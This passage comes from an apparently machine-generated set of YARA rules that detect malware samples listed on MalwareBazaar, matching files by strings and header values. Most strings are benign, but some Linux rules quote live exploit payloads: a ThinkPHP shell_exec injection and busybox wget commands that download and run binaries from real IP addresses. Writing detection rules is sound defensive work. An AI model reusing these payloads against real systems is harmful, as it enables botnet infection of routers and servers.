        $s12 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s13 = "- Attempt to initialize the CRT more than once."
        $s14 = "- unable to open console device"
        $s15 = "- unexpected multithread lock error"
        $s16 = "- not enough space for thread data"
        $s17 = "- floating point support not loaded"
        $s18 = "SystemFunction036"
        $s19 = "ADVAPI32.DLL"
        $s20 = "GetProcessWindowStation"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2236KB and
        all of them
}

rule Windows_b0c30b90084fcb391f604153668c62f26df0ffd7c3b49ae2769a38e1e17f8c43
{
    meta:
        description = "Auto ML: b0c30b90084fcb391f604153668c62f26df0ffd7c3b49ae2769a38e1e17f8c43"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "KERNEL32"
        $s6 = "comctl32.dll"
        $s7 = "comdlg32.dll"
        $s8 = "CCmdTarget"
        $s9 = "GetMonitorInfoA"
        $s10 = "MonitorFromWindow"
        $s11 = "GetSystemMetrics"
        $s12 = "USER32"
        $s13 = "f:\\dd\\vctools\\vc7libs\\ship\\atlmfc\\include\\afxwin2.inl"
        $s14 = "f:\\dd\\vctools\\vc7libs\\ship\\atlmfc\\include\\afxwin1.inl"
        $s15 = "CUserException"
        $s16 = "kernel32.dll"
        $s17 = "CFile"
        $s18 = "f:\\dd\\vctools\\vc7libs\\ship\\atlmfc\\src\\mfc\\filecore.cpp"
        $s19 = "CFileException"
        $s20 = "ppiRetPackageFilePatcher"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2155KB and
        all of them
}

rule Windows_b107d13d86463788a3f85ae223f77014034229e0a5746bb871c37bc11c1ba0f4
{
    meta:
        description = "Auto ML: b107d13d86463788a3f85ae223f77014034229e0a5746bb871c37bc11c1ba0f4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "SELECT * FROM Win32_OperatingSystem"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetDefaultDllDirectories"
        $s9 = "s:IDS_BROWSETITLE"
        $s10 = "s:IDS_CMDEXTRACTING"
        $s11 = "s:IDS_FILEHEADERBROKEN"
        $s12 = "s:IDS_CANNOTOPEN"
        $s13 = "s:IDS_CANNOTCREATE"
        $s14 = "s:IDS_WRITEERROR"
        $s15 = "s:IDS_READERROR"
        $s16 = "s:IDS_CLOSEERROR"
        $s17 = "s:IDS_CREATEERRORS"
        $s18 = "s:IDS_ALLFILES"
        $s19 = "s:IDS_EXTRFILESTO"
        $s20 = "s:IDS_EXTRFILESTOTEMP"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1756KB and
        all of them
}

rule Windows_b12aff75a9a173c15b91ad9b89718f7e73dcd72d97a623d732c4b24f52872b65
{
    meta:
        description = "Auto ML: b12aff75a9a173c15b91ad9b89718f7e73dcd72d97a623d732c4b24f52872b65"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4596KB and
        all of them
}

rule Windows_b16d09a973fb8c46df38221c297ce2f568ac2d9332d3fee471d4b40a7e677877
{
    meta:
        description = "Auto ML: b16d09a973fb8c46df38221c297ce2f568ac2d9332d3fee471d4b40a7e677877"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "Failed to extract %s: failed to allocate temporary input buffer!"
        $s7 = "Failed to extract %s: failed to allocate temporary output buffer!"
        $s8 = "Failed to extract %s: failed to allocate temporary buffer!"
        $s9 = "Failed to extract %s: failed to read data chunk!"
        $s10 = "fread"
        $s11 = "Failed to extract %s: failed to write data chunk!"
        $s12 = "fwrite"
        $s13 = "Failed to extract %s: failed to open archive file!"
        $s14 = "pyi_arch_extract2fs was called before temporary directory was initialized!"
        $s15 = "Failed to create symbolic link %s!"
        $s16 = "Failed to extract %s: failed to open target file!"
        $s17 = "fopen"
        $s18 = "Failed to read cookie!"
        $s19 = "Could not read full TOC!"
        $s20 = "Error on file."
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 23712KB and
        all of them
}

rule Windows_124d756a655a6c4338f61ec8f43551dce23078e04d51ca4c03ca34f5df66af27
{
    meta:
        description = "Auto ML: 124d756a655a6c4338f61ec8f43551dce23078e04d51ca4c03ca34f5df66af27"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2544KB and
        all of them
}

rule Linux_b1830212eb7e8f96fc0de55a7b2eb71c0dd6ea0761fce5dc2ada2be29d7a454b
{
    meta:
        description = "Auto ML: b1830212eb7e8f96fc0de55a7b2eb71c0dd6ea0761fce5dc2ada2be29d7a454b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 191KB and
        all of them
}

rule Windows_b192344ce34120edcbae9a176d8406c18d78a177e5e186f735caa436ec473edf
{
    meta:
        description = "Auto ML: b192344ce34120edcbae9a176d8406c18d78a177e5e186f735caa436ec473edf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rdata"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "libgcc_s_dw2-1.dll"
        $s7 = "Error, failed to open '%ls' for writing."
        $s8 = "Error, couldn't unpack file to target path."
        $s9 = "NUITKA_ONEFILE_PARENT"
        $s10 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p."
        $s11 = "CloseHandle"
        $s12 = "CopyFileW"
        $s13 = "CreateDirectoryW"
        $s14 = "CreateFileMappingW"
        $s15 = "CreateFileW"
        $s16 = "CreateProcessW"
        $s17 = "DeleteCriticalSection"
        $s18 = "DeleteFileW"
        $s19 = "GetCommandLineW"
        $s20 = "GetCurrentProcessId"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 17546KB and
        all of them
}

rule Windows_b19de61d027c066c42afa7cfa6b81c26792d310d07bfb38481deb842796de3dc
{
    meta:
        description = "Auto ML: b19de61d027c066c42afa7cfa6b81c26792d310d07bfb38481deb842796de3dc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<DeleteSelectedNodes>b__50_0"
        $s5 = "<GetInputs>b__66_0"
        $s6 = "<get_OutputSocket>b__17_0"
        $s7 = "<GetOutputs>b__67_0"
        $s8 = "<get_InputSocket>b__19_0"
        $s9 = "<GetNodes>b__0"
        $s10 = "<DeleteSelectedNodes>b__50_1"
        $s11 = "get_Panel1"
        $s12 = "ReadInt32"
        $s13 = "<DeleteSelectedNodes>b__50_2"
        $s14 = "get_Panel2"
        $s15 = "<DeleteSelectedNodes>b__3"
        $s16 = "<DeleteSelectedNodes>b__50_4"
        $s17 = "<Module>"
        $s18 = "System.Drawing.Drawing2D"
        $s19 = "System.IO"
        $s20 = "GetObjectData"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 675KB and
        all of them
}

rule Linux_b1d2da65467eb7659ef56a845c6f5e6081eac95317699c3ebe3f7ffaf1e58c0f
{
    meta:
        description = "Auto ML: b1d2da65467eb7659ef56a845c6f5e6081eac95317699c3ebe3f7ffaf1e58c0f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "GET /index.php?s=/index/"
        $s4 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://141.98.10.85/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1"
        $s5 = "User-Agent: Uirusu/2.0"
        $s6 = "POST /cgi-bin/ViewLog.asp HTTP/1.1"
        $s7 = "User-Agent: python-requests/2.20.0"
        $s8 = "/bin/busybox wget http://141.98.10.85/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh"
        $s9 = ".text"
        $s10 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 75KB and
        all of them
}

rule Windows_b22fe6314764fb34843b2844fbd48a50223947dc388a9a854fe4076f9271a8fc
{
    meta:
        description = "Auto ML: b22fe6314764fb34843b2844fbd48a50223947dc388a9a854fe4076f9271a8fc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "<Module>"
        $s6 = "dwrenYv.exe"
        $s7 = "UserPermissions"
        $s8 = "UserRole"
        $s9 = "ItemSetupForm"
        $s10 = "System"
        $s11 = "System.Windows.Forms"
        $s12 = "System.Resources"
        $s13 = "System.Security.Cryptography"
        $s14 = "System.ComponentModel"
        $s15 = "ItemSetupForm_Load"
        $s16 = "Reset"
        $s17 = "System.Reflection"
        $s18 = "AssemblyFileVersionAttribute"
        $s19 = "System.Runtime.InteropServices"
        $s20 = "System.Runtime.CompilerServices"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 336KB and
        all of them
}

rule Windows_b2488b2c5b57839b8dda99b6d19bfed796f37d4493c4ff82abb568ad1ae162b9
{
    meta:
        description = "Auto ML: b2488b2c5b57839b8dda99b6d19bfed796f37d4493c4ff82abb568ad1ae162b9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = ".data"
        $s3 = ".rdata"
        $s4 = ".reloc"
        $s5 = "@.rdata"
        $s6 = "@.rsrc"
        $s7 = "disclose, use or permit the disclosure or use by others of the TRMs for any other purpose. You shall not use the TRMs to"
        $s8 = "GetLastError"
        $s9 = "SetLastError"
        $s10 = "GetTickCount"
        $s11 = "ExitProcess"
        $s12 = "GetStartupInfoA"
        $s13 = "GetStdHandle"
        $s14 = "GetCommandLineA"
        $s15 = "GetCurrentProcessId"
        $s16 = "GetCurrentThreadId"
        $s17 = "GetCurrentProcess"
        $s18 = "ReadProcessMemory"
        $s19 = "GetModuleFileNameA"
        $s20 = "GetModuleHandleA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2957KB and
        all of them
}

rule Windows_b25af4572dd097dbd390387a5a57c12ab9d914095072a5508c4905688c3688d3
{
    meta:
        description = "Auto ML: b25af4572dd097dbd390387a5a57c12ab9d914095072a5508c4905688c3688d3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!Require Windows"
        $s2 = ".text"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".rsrc"
        $s6 = "SetThreadPreferredUILanguages"
        $s7 = "kernel32"
        $s8 = "SetProcessPreferredUILanguages"
        $s9 = "GetNativeSystemInfo"
        $s10 = "Could not overwrite file \"%s\"."
        $s11 = "Could not create file \"%s\"."
        $s12 = "No \"HelpText\" in the configuration file."
        $s13 = "\"setup.exe\""
        $s14 = "Could not find \"setup.exe\"."
        $s15 = "Could not delete file or folder \"%s\"."
        $s16 = "Could not create folder \"%s\"."
        $s17 = "Could not write SFX configuration."
        $s18 = "Could not read SFX configuration or configuration not found."
        $s19 = "Could not open archive file \"%s\"."
        $s20 = "Could not get SFX filename."
    condition:
        uint32(0) == 0x00605a4d and
        filesize < 3072KB and
        all of them
}

rule Windows_b35490f99592ad91618f64b1d8a21ab9c0cd878186b8919ead3f637761387b5d
{
    meta:
        description = "Auto ML: b35490f99592ad91618f64b1d8a21ab9c0cd878186b8919ead3f637761387b5d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "delete"
        $s6 = "delete[]"
        $s7 = "`placement delete closure'"
        $s8 = "`placement delete[] closure'"
        $s9 = "`local static thread guard'"
        $s10 = "FlsGetValue"
        $s11 = "FlsSetValue"
        $s12 = "CorExitProcess"
        $s13 = "AreFileApisANSI"
        $s14 = "AppPolicyGetProcessTerminationMethod"
        $s15 = ".text$mn"
        $s16 = ".text$x"
        $s17 = ".rdata"
        $s18 = ".rdata$r"
        $s19 = ".rdata$sxdata"
        $s20 = ".rdata$voltmd"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 718KB and
        all of them
}

rule Windows_b3b22e2ee95e4f84c9d88a6b110c1c884fc5f64266107d2928d75c4cf6748a7d
{
    meta:
        description = "Auto ML: b3b22e2ee95e4f84c9d88a6b110c1c884fc5f64266107d2928d75c4cf6748a7d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "kernel32.dll"
        $s3 = "GetModuleHandleA"
        $s4 = "mscoree.dll"
        $s5 = "If you want to change the Windows User Account Control level replace the"
        $s6 = "requestedExecutionLevel node with one of the following."
        $s7 = "<requestedExecutionLevel  level=\"requireAdministrator\" uiAccess=\"false\" />"
        $s8 = "Specifying requestedExecutionLevel element will disable file and registry virtualization."
        $s9 = "<defaultAssemblyRequest permissionSetReference=\"Custom\" />"
        $s10 = "<PermissionSet class=\"System.Security.PermissionSet\" version=\"1\" Unrestricted=\"true\" ID=\"Custom\" SameSite=\"site\" />"
        $s11 = "<!-- A list of the Windows versions that this application has been tested on"
        $s12 = "and Windows will automatically select the most compatible environment. -->"
        $s13 = "<!-- Windows Vista -->"
        $s14 = "<!-- Windows 7 -->"
        $s15 = "<!-- Windows 8 -->"
        $s16 = "<!-- Windows 8.1 -->"
        $s17 = "<!-- Windows 10 -->"
        $s18 = "<!-- Indicates that the application is DPI-aware and will not be automatically scaled by Windows at higher"
        $s19 = "DPIs. Windows Presentation Foundation (WPF) applications are automatically DPI-aware and do not need"
        $s20 = "to opt in. Windows Forms applications targeting .NET Framework 4.6 that opt into this setting, should"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5281KB and
        all of them
}

rule Windows_b42c2d040474f0dcce74562fda0cca005e2be2e9ede6a70cd49f1a2878d8eb99
{
    meta:
        description = "Auto ML: b42c2d040474f0dcce74562fda0cca005e2be2e9ede6a70cd49f1a2878d8eb99"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "4XkzuOv6V9oc28t,System.Private.CoreLib"
        $s7 = "4System.Private.CoreLib.dll"
        $s8 = "4System.Diagnostics.Process"
        $s9 = "<System.Diagnostics.Process.dll"
        $s10 = "@System.ComponentModel.Primitives"
        $s11 = "HSystem.ComponentModel.Primitives.dll"
        $s12 = "$System.ObjectModel"
        $s13 = ",System.ObjectModel.dll"
        $s14 = "System.Linq"
        $s15 = "System.Linq.dll"
        $s16 = "System"
        $s17 = "System.dllFSystem.ComponentModel.TypeConverter"
        $s18 = "NSystem.ComponentModel.TypeConverter.dll"
        $s19 = ":System.Collections.NonGeneric"
        $s20 = "BSystem.Collections.NonGeneric.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5320KB and
        all of them
}

rule Linux_12665ab1558479db12aea7281f21cb2ce26b2fc7444364ae5f6f37e2d4833e50
{
    meta:
        description = "Auto ML: 12665ab1558479db12aea7281f21cb2ce26b2fc7444364ae5f6f37e2d4833e50"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "GET /index.php?s=/index/"
        $s4 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://2.58.113.120/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1"
        $s5 = "User-Agent: Uirusu/2.0"
        $s6 = "POST /cgi-bin/ViewLog.asp HTTP/1.1"
        $s7 = "User-Agent: python-requests/2.20.0"
        $s8 = "/bin/busybox wget http://2.58.113.120/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh"
        $s9 = ".text"
        $s10 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 71KB and
        all of them
}

rule Windows_b45913c02189ace3a8b69802b6d514811a14120ddd5a3c90cc68888571d4837f
{
    meta:
        description = "Auto ML: b45913c02189ace3a8b69802b6d514811a14120ddd5a3c90cc68888571d4837f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "jgvlovux.exe"
        $s6 = "System"
        $s7 = "System.Drawing"
        $s8 = "winmm"
        $s9 = "winscard"
        $s10 = "kernel32"
        $s11 = "kernel32.dll"
        $s12 = "<Module>"
        $s13 = "DebuggerNonUserCodeAttribute"
        $s14 = "System.Diagnostics"
        $s15 = "System.CodeDom.Compiler"
        $s16 = "System.ComponentModel"
        $s17 = "m_UserObjectProvider"
        $s18 = "User"
        $s19 = "get_GetInstance"
        $s20 = "get_Computer"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 63KB and
        all of them
}

rule Windows_b46ca6b63b5c418471e737ff53381b4a58bc2f501f947778fa96a9cbee5ffb8f
{
    meta:
        description = "Auto ML: b46ca6b63b5c418471e737ff53381b4a58bc2f501f947778fa96a9cbee5ffb8f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 180KB and
        all of them
}

rule Windows_b46dbf808c2ebb31c7c25f239f2d0eda5a4474341940e3fdb15d92ba945bf1a4
{
    meta:
        description = "Auto ML: b46dbf808c2ebb31c7c25f239f2d0eda5a4474341940e3fdb15d92ba945bf1a4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "ThreadSafeObjectProvider`1"
        $s6 = "Settings"
        $s7 = "ClientSocket"
        $s8 = "System"
        $s9 = "get_Computer"
        $s10 = "get_Application"
        $s11 = "User"
        $s12 = "get_User"
        $s13 = "m_UserObjectProvider"
        $s14 = "get_WebServices"
        $s15 = "GetHashCode"
        $s16 = "GetType"
        $s17 = "Create__Instance__"
        $s18 = "get_GetInstance"
        $s19 = "m_ThreadStaticValue"
        $s20 = "GetInstance"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 47KB and
        all of them
}

rule Linux_b471287dac14c4ce3c675d9d3ef9bda965ff4f3db1eb45af72549a9794425770
{
    meta:
        description = "Auto ML: b471287dac14c4ce3c675d9d3ef9bda965ff4f3db1eb45af72549a9794425770"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "closedir"
        $s2 = "setsockopt"
        $s3 = "close"
        $s4 = "readlink"
        $s5 = "memset"
        $s6 = "getppid"
        $s7 = "write"
        $s8 = "opendir"
        $s9 = "sigaddset"
        $s10 = "getsockopt"
        $s11 = "readdir"
        $s12 = "read"
        $s13 = "setsid"
        $s14 = "sigemptyset"
        $s15 = "open"
        $s16 = "connect"
        $s17 = "getpid"
        $s18 = "socket"
        $s19 = "getsockname"
        $s20 = "HTTP/1.1"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 66KB and
        all of them
}

rule Windows_b474b5897b9d187e03a1eec0cde75b65d3d92566c05c0fec4beed484ceb7915a
{
    meta:
        description = "Auto ML: b474b5897b9d187e03a1eec0cde75b65d3d92566c05c0fec4beed484ceb7915a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!setybdeta}"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s7 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null"
        $s8 = "SetEofOn00"
        $s9 = "<GetPacketTypes>b__3_0"
        $s10 = "<WinSCPDecrypt>b__4_0"
        $s11 = "OffsetMAIN_0"
        $s12 = "<GetReverseProxyByConnectionId>b__0"
        $s13 = "<GetKeyValues>b__0"
        $s14 = "<Process>b__0"
        $s15 = "get_Scan0"
        $s16 = "ProcessCrlB1"
        $s17 = "MicrosoftCertTemplateV1"
        $s18 = "get_KnowledgeProofForX1"
        $s19 = "Http_1_1"
        $s20 = "<GetKeyValues>b__15_1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB and
        all of them
}

rule Android_b497bc5dee3664fb632158982f338fe9f52e58d49da225e9d8c0f25bb3ebdb85
{
    meta:
        description = "Auto ML: b497bc5dee3664fb632158982f338fe9f52e58d49da225e9d8c0f25bb3ebdb85"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "assets/dexopt/baseline.prof"
        $s2 = "assets/dexopt/baseline.profm"
        $s3 = "qGEt"
        $s4 = "wInY\"VPO"
        $s5 = ":cMds~B"
        $s6 = "Kget"
        $s7 = "cmDG"
        $s8 = "sget_"
        $s9 = "xwin"
        $s10 = "Cmdg"
        $s11 = "`setb"
        $s12 = "res/color/mtrl_chip_close_icon_tint.xml"
        $s13 = "XICC_PROFILE"
        $s14 = "IEC http://www.iec.ch"
        $s15 = ",Reference Viewing Condition in IEC61966-2.1"
        $s16 = "YWin"
        $s17 = "''res/color/mtrl_chip_close_icon_tint.xml"
        $s18 = ">>*Tips: If you already have an account, you can log in directly"
        $s19 = "ll*Video uploading and publishing specifications, read the specifications first, and then answer the questions"
        $s20 = "3. The title is also very important. An attractive title is the direct result of the user"
    condition:
        uint32(0) == 0x04034b50 and
        filesize < 16725KB and
        all of them
}

rule Windows_b549699feb7101de2a3895a291a9034053b5c8b2e3b369cf947ae467e9239ab7
{
    meta:
        description = "Auto ML: b549699feb7101de2a3895a291a9034053b5c8b2e3b369cf947ae467e9239ab7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "lGET"
        $s6 = "<Module>"
        $s7 = "Writer"
        $s8 = "System"
        $s9 = "System.Collections.Generic"
        $s10 = "fileNames"
        $s11 = "fileTypes"
        $s12 = "fileRunTypes"
        $s13 = "fileDropPaths"
        $s14 = "GetResource"
        $s15 = "WriteAllBytes"
        $s16 = "GetModuleHandle"
        $s17 = "file"
        $s18 = "fileBytes"
        $s19 = "lpModuleName"
        $s20 = "hProcess"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6621KB and
        all of them
}

rule Linux_b56a20c32494a5436c02efb0591ac8227a7dc4d92fa6bf68de9135b65674e0c0
{
    meta:
        description = "Auto ML: b56a20c32494a5436c02efb0591ac8227a7dc4d92fa6bf68de9135b65674e0c0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s2 = "Connection: keep-alive"
        $s3 = "/proc/%s/cmdline"
        $s4 = "systemd"
        $s5 = "http"
        $s6 = "(deleted)"
        $s7 = "[VapeBot/Killer/TCP] Killed Process: %s, PID: %d"
        $s8 = "[VapeBot/Killer/CMD] Killed Process: %s, PID: %d"
        $s9 = "[VapeBot/Killer/Stat] Killed Process: %s, PID: %d"
        $s10 = "[VapeBot/Killer/PS] Killed process: %s, PID: %d"
        $s11 = "[VapeBot/Killer/Maps] Killed Process: %s, PID: %d"
        $s12 = "[VapeBot/Killer/EXE] Killed process: %s, PID: %d"
        $s13 = "/proc/self/cmdline"
        $s14 = "No such file or directory"
        $s15 = "No such process"
        $s16 = "Interrupted system call"
        $s17 = "Bad file descriptor"
        $s18 = "No child processes"
        $s19 = "Resource temporarily unavailable"
        $s20 = "File exists"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 71KB and
        all of them
}

rule Windows_b57fe599791c010401a65bd6064dfd0ea26c71853999077198056bb821a8d1a4
{
    meta:
        description = "Auto ML: b57fe599791c010401a65bd6064dfd0ea26c71853999077198056bb821a8d1a4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!Require Windows"
        $s2 = ".text"
        $s3 = "`.rdata"
        $s4 = "@.data"
